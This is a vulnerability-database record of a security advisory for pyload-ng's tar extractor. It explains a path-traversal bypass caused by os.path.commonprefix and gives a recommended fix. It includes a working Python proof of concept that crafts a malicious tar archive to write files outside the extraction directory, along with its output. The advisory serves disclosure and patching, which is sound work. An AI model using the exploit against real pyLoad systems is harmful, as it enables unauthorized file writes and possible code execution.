@@ -1,0 +1,273 @@
+advisory_id: GHSA-mvwx-582f-56r7
+datasource_id: github_osv/GHSA-mvwx-582f-56r7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-mvwx-582f-56r7/GHSA-mvwx-582f-56r7.json
+aliases:
+  - CVE-2026-35592
+summary: |
+  pyload-ng: Incomplete Tar Path Traversal Fix in UnTar._safe_extractall via os.path.commonprefix Bypass
+  ## Summary
+
+  The `_safe_extractall()` function in `src/pyload/plugins/extractors/UnTar.py` uses `os.path.commonprefix()` for its path traversal check, which performs character-level string comparison rather than path-level comparison. This allows a specially crafted tar archive to write files outside the intended extraction directory. The correct function `os.path.commonpath()` was added to the codebase in the GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) but was never applied to `_safe_extractall()`, making this an incomplete fix.
+
+  ## Details
+
+  The GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) added a correct `is_within_directory()` function to `src/pyload/core/utils/fs.py:384-391` using `os.path.commonpath()`:
+
+  ```python
+  # fs.py:384 — CORRECT implementation
+  def is_within_directory(base_dir, target_dir):
+      real_base = os.path.realpath(base_dir)
+      real_target = os.path.realpath(target_dir)
+      return os.path.commonpath([real_base, real_target]) == real_base
+  ```
+
+  However, the `_safe_extractall()` function in `UnTar.py:10-22` was left unchanged with the broken `os.path.commonprefix()`:
+
+  ```python
+  # UnTar.py:10-22 — VULNERABLE implementation
+  def _safe_extractall(tar, path=".", members=None, *, numeric_owner=False):
+      def _is_within_directory(directory, target):
+          abs_directory = os.path.abspath(directory)
+          abs_target = os.path.abspath(target)
+          prefix = os.path.commonprefix([abs_directory, abs_target])  # BUG: line 14
+          return prefix == abs_directory
+
+      for member in tar.getmembers():
+          member_path = os.path.join(path, member.name)
+          if not _is_within_directory(path, member_path):
+              raise ArchiveError("Attempted Path Traversal in Tar File (CVE-2007-4559)")
+
+      tar.extractall(path, members, numeric_owner=numeric_owner)
+  ```
+
+  `os.path.commonprefix()` is a **string operation**, not a path operation. For extraction destination `/downloads/pkg` and a malicious member `../pkg_evil/payload` (resolving to `/downloads/pkg_evil/payload`):
+
+  - `commonprefix(['/downloads/pkg', '/downloads/pkg_evil/payload'])` → `'/downloads/pkg'` — **equals the directory, check passes**
+  - `commonpath(['/downloads/pkg', '/downloads/pkg_evil/payload'])` → `'/downloads'` — **does NOT equal the directory, check correctly fails**
+
+  The extraction path is reached via: `ExtractArchive.package_finished()` (line 182) → `extract_queued()` → `UnTar.extract()` (line 76) → `_safe_extractall(t, self.dest)` (line 81).
+
+  ## PoC
+
+  Self-contained proof of concept demonstrating the bypass:
+
+  ```python
+  import tarfile, io, os, shutil
+
+  dest = '/tmp/test_extraction_dir'
+  shutil.rmtree(dest, ignore_errors=True)
+  shutil.rmtree('/tmp/test_extraction_dir_pwned', ignore_errors=True)
+  os.makedirs(dest, exist_ok=True)
+
+  # Step 1: Create malicious tar with member that escapes via prefix trick
+  with tarfile.open('/tmp/evil.tar.gz', 'w:gz') as tar:
+      info = tarfile.TarInfo(name='../test_extraction_dir_pwned/evil.txt')
+      data = b'escaped the sandbox!'
+      info.size = len(data)
+      tar.addfile(info, io.BytesIO(data))
+
+  # Step 2: Reproduce the vulnerable check from UnTar.py:11-15
+  def _is_within_directory(directory, target):
+      abs_directory = os.path.abspath(directory)
+      abs_target = os.path.abspath(target)
+      prefix = os.path.commonprefix([abs_directory, abs_target])
+      return prefix == abs_directory
+
+  # Step 3: Verify the check is bypassed
+  with tarfile.open('/tmp/evil.tar.gz') as tar:
+      for member in tar.getmembers():
+          member_path = os.path.join(dest, member.name)
+          bypassed = _is_within_directory(dest, member_path)
+          print(f'Member: {member.name}')
+          print(f'Resolved: {os.path.abspath(member_path)}')
+          print(f'Check passes (should be False): {bypassed}')
+      tar.extractall(dest)
+
+  # Step 4: Confirm file was written outside extraction directory
+  escaped_file = '/tmp/test_extraction_dir_pwned/evil.txt'
+  assert os.path.exists(escaped_file), "File did not escape"
+  print(f'File escaped to: {escaped_file}')
+  print(f'Content: {open(escaped_file).read()}')
+  ```
+
+  Output:
+  ```
+  Member: ../test_extraction_dir_pwned/evil.txt
+  Resolved: /tmp/test_extraction_dir_pwned/evil.txt
+  Check passes (should be False): True
+  File escaped to: /tmp/test_extraction_dir_pwned/evil.txt
+  Content: escaped the sandbox!
+  ```
+
+  ## Impact
+
+  An attacker who hosts a malicious `.tar.gz` archive on a file hosting service can write files to arbitrary sibling directories of the extraction path when a pyLoad user downloads and extracts the archive. This enables:
+
+  - Writing files outside the intended extraction directory into adjacent directories
+  - Overwriting other users' downloads
+  - Planting malicious files in predictable locations on disk
+  - If combined with other primitives (e.g., writing a `.bashrc`, cron job, or plugin file), this could lead to code execution
+
+  The attack requires the victim to download a malicious archive (either manually or via the pyLoad API with ADD permission) and have the ExtractArchive addon enabled.
+
+  ## Recommended Fix
+
+  Replace the broken inline `_is_within_directory` with the correct `is_within_directory` from `pyload.core.utils.fs`:
+
+  ```python
+  import os
+  import sys
+  import tarfile
+
+  from pyload.core.utils.fs import is_within_directory, safejoin
+  from pyload.plugins.base.extractor import ArchiveError, BaseExtractor, CRCError
+
+
+  # Fix for tarfile CVE-2007-4559
+  def _safe_extractall(tar, path=".", members=None, *, numeric_owner=False):
+      for member in tar.getmembers():
+          member_path = os.path.join(path, member.name)
+          if not is_within_directory(path, member_path):
+              raise ArchiveError("Attempted Path Traversal in Tar File (CVE-2007-4559)")
+
+      tar.extractall(path, members, numeric_owner=numeric_owner)
+  ```
+
+  This removes the broken inline function and uses the already-existing correct implementation that was added in the GHSA-7g4m-8hx2-4qh3 fix.
+impacted_packages:
+  - purl: pkg:pypi/pyload-ng
+    affected_versions: vers:pypi/<0.5.0b3.dev97
+    fixed_versions: vers:pypi/0.5.0b3.dev97
+    affected_packages:
+      - pkg:pypi/pyload-ng@0.5.0a5.dev528
+      - pkg:pypi/pyload-ng@0.5.0a5.dev532
+      - pkg:pypi/pyload-ng@0.5.0a5.dev535
+      - pkg:pypi/pyload-ng@0.5.0a5.dev536
+      - pkg:pypi/pyload-ng@0.5.0a5.dev537
+      - pkg:pypi/pyload-ng@0.5.0a5.dev539
+      - pkg:pypi/pyload-ng@0.5.0a5.dev540
+      - pkg:pypi/pyload-ng@0.5.0a5.dev545
+      - pkg:pypi/pyload-ng@0.5.0a5.dev562
+      - pkg:pypi/pyload-ng@0.5.0a5.dev564
+      - pkg:pypi/pyload-ng@0.5.0a5.dev565
+      - pkg:pypi/pyload-ng@0.5.0a6.dev570
+      - pkg:pypi/pyload-ng@0.5.0a6.dev578
+      - pkg:pypi/pyload-ng@0.5.0a6.dev587
+      - pkg:pypi/pyload-ng@0.5.0a7.dev596
+      - pkg:pypi/pyload-ng@0.5.0a8.dev602
+      - pkg:pypi/pyload-ng@0.5.0a9.dev615
+      - pkg:pypi/pyload-ng@0.5.0a9.dev629
+      - pkg:pypi/pyload-ng@0.5.0a9.dev632
+      - pkg:pypi/pyload-ng@0.5.0a9.dev641
+      - pkg:pypi/pyload-ng@0.5.0a9.dev643
+      - pkg:pypi/pyload-ng@0.5.0a9.dev655
+      - pkg:pypi/pyload-ng@0.5.0a9.dev806
+      - pkg:pypi/pyload-ng@0.5.0b1.dev1
+      - pkg:pypi/pyload-ng@0.5.0b1.dev2
+      - pkg:pypi/pyload-ng@0.5.0b1.dev3
+      - pkg:pypi/pyload-ng@0.5.0b1.dev4
+      - pkg:pypi/pyload-ng@0.5.0b1.dev5
+      - pkg:pypi/pyload-ng@0.5.0b2.dev9
+      - pkg:pypi/pyload-ng@0.5.0b2.dev10
+      - pkg:pypi/pyload-ng@0.5.0b2.dev11
+      - pkg:pypi/pyload-ng@0.5.0b2.dev12
+      - pkg:pypi/pyload-ng@0.5.0b3.dev13
+      - pkg:pypi/pyload-ng@0.5.0b3.dev14
+      - pkg:pypi/pyload-ng@0.5.0b3.dev17
+      - pkg:pypi/pyload-ng@0.5.0b3.dev18
+      - pkg:pypi/pyload-ng@0.5.0b3.dev19
+      - pkg:pypi/pyload-ng@0.5.0b3.dev20
+      - pkg:pypi/pyload-ng@0.5.0b3.dev21
+      - pkg:pypi/pyload-ng@0.5.0b3.dev22
+      - pkg:pypi/pyload-ng@0.5.0b3.dev24
+      - pkg:pypi/pyload-ng@0.5.0b3.dev26
+      - pkg:pypi/pyload-ng@0.5.0b3.dev27
+      - pkg:pypi/pyload-ng@0.5.0b3.dev28
+      - pkg:pypi/pyload-ng@0.5.0b3.dev29
+      - pkg:pypi/pyload-ng@0.5.0b3.dev30
+      - pkg:pypi/pyload-ng@0.5.0b3.dev31
+      - pkg:pypi/pyload-ng@0.5.0b3.dev32
+      - pkg:pypi/pyload-ng@0.5.0b3.dev33
+      - pkg:pypi/pyload-ng@0.5.0b3.dev34
+      - pkg:pypi/pyload-ng@0.5.0b3.dev35
+      - pkg:pypi/pyload-ng@0.5.0b3.dev38
+      - pkg:pypi/pyload-ng@0.5.0b3.dev39
+      - pkg:pypi/pyload-ng@0.5.0b3.dev40
+      - pkg:pypi/pyload-ng@0.5.0b3.dev41
+      - pkg:pypi/pyload-ng@0.5.0b3.dev42
+      - pkg:pypi/pyload-ng@0.5.0b3.dev43
+      - pkg:pypi/pyload-ng@0.5.0b3.dev44
+      - pkg:pypi/pyload-ng@0.5.0b3.dev45
+      - pkg:pypi/pyload-ng@0.5.0b3.dev46
+      - pkg:pypi/pyload-ng@0.5.0b3.dev47
+      - pkg:pypi/pyload-ng@0.5.0b3.dev48
+      - pkg:pypi/pyload-ng@0.5.0b3.dev49
+      - pkg:pypi/pyload-ng@0.5.0b3.dev50
+      - pkg:pypi/pyload-ng@0.5.0b3.dev51
+      - pkg:pypi/pyload-ng@0.5.0b3.dev52
+      - pkg:pypi/pyload-ng@0.5.0b3.dev53
+      - pkg:pypi/pyload-ng@0.5.0b3.dev54
+      - pkg:pypi/pyload-ng@0.5.0b3.dev57
+      - pkg:pypi/pyload-ng@0.5.0b3.dev60
+      - pkg:pypi/pyload-ng@0.5.0b3.dev62
+      - pkg:pypi/pyload-ng@0.5.0b3.dev64
+      - pkg:pypi/pyload-ng@0.5.0b3.dev65
+      - pkg:pypi/pyload-ng@0.5.0b3.dev66
+      - pkg:pypi/pyload-ng@0.5.0b3.dev67
+      - pkg:pypi/pyload-ng@0.5.0b3.dev68
+      - pkg:pypi/pyload-ng@0.5.0b3.dev69
+      - pkg:pypi/pyload-ng@0.5.0b3.dev70
+      - pkg:pypi/pyload-ng@0.5.0b3.dev71
+      - pkg:pypi/pyload-ng@0.5.0b3.dev72
+      - pkg:pypi/pyload-ng@0.5.0b3.dev73
+      - pkg:pypi/pyload-ng@0.5.0b3.dev74
+      - pkg:pypi/pyload-ng@0.5.0b3.dev75
+      - pkg:pypi/pyload-ng@0.5.0b3.dev76
+      - pkg:pypi/pyload-ng@0.5.0b3.dev77
+      - pkg:pypi/pyload-ng@0.5.0b3.dev78
+      - pkg:pypi/pyload-ng@0.5.0b3.dev79
+      - pkg:pypi/pyload-ng@0.5.0b3.dev80
+      - pkg:pypi/pyload-ng@0.5.0b3.dev81
+      - pkg:pypi/pyload-ng@0.5.0b3.dev82
+      - pkg:pypi/pyload-ng@0.5.0b3.dev85
+      - pkg:pypi/pyload-ng@0.5.0b3.dev87
+      - pkg:pypi/pyload-ng@0.5.0b3.dev88
+      - pkg:pypi/pyload-ng@0.5.0b3.dev89
+      - pkg:pypi/pyload-ng@0.5.0b3.dev90
+      - pkg:pypi/pyload-ng@0.5.0b3.dev91
+      - pkg:pypi/pyload-ng@0.5.0b3.dev92
+      - pkg:pypi/pyload-ng@0.5.0b3.dev93
+      - pkg:pypi/pyload-ng@0.5.0b3.dev94
+      - pkg:pypi/pyload-ng@0.5.0b3.dev95
+      - pkg:pypi/pyload-ng@0.5.0b3.dev96
+    fixed_packages:
+      - pkg:pypi/pyload-ng@0.5.0b3.dev97
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-mvwx-582f-56r7/GHSA-mvwx-582f-56r7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/pyload/pyload
+    reference_type:
+    reference_id:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-124.yaml
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-35592
+    reference_type:
+    reference_id: CVE-2026-35592
+  - url: https://github.com/pyload/pyload/security/advisories/GHSA-mvwx-582f-56r7
+    reference_type:
+    reference_id: GHSA-mvwx-582f-56r7
+exploits: []
